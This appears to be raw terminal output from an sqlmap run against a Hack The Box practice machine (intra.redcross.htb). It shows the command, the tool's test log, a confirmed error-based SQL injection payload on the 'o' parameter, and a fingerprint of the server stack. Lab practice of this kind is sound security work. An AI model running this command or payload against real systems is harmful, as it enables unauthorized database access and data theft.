sqlmap -r tmp/login.txt --risk=3 -p o --dbms=mysql --random-agent --delay=1 --technique=UE
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                          
|_ -| . [(]     | .'| . |                                                                                                                                                                                         
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:56:17 /2022-11-07/

[18:56:17] [INFO] parsing HTTP request from 'tmp/login.txt'
[18:56:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.6) Gecko/20050321 Firefox/1.0.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[18:56:17] [INFO] testing connection to the target URL
got a 301 redirect to 'https://intra.redcross.htb/?o=2&page=app'. Do you want to follow? [Y/n] y
[18:56:32] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')
[18:56:33] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks
[18:56:33] [INFO] testing for SQL injection on GET parameter 'o'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] y
[18:56:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:56:48] [WARNING] reflective value(s) found and filtering out
[18:57:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:58:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:00:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:01:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[19:02:11] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[19:03:16] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:04:22] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:05:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:05:47] [INFO] GET parameter 'o' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[19:05:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:05:47] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[19:05:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:06:13] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[19:33:01] [INFO] testing 'MySQL UNION query (81) - 21 to 40 columns'
[19:33:25] [INFO] testing 'MySQL UNION query (81) - 41 to 60 columns'
[19:33:50] [INFO] testing 'MySQL UNION query (81) - 61 to 80 columns'
[19:34:14] [INFO] testing 'MySQL UNION query (81) - 81 to 100 columns'
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 575 HTTP(s) requests:
---
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=2') AND (SELECT 7814 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(7814=7814,1))),0x7170787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- cchJ&page=app
---
[19:34:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:35:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/intra.redcross.htb'

[*] ending @ 19:35:06 /2022-11-07/
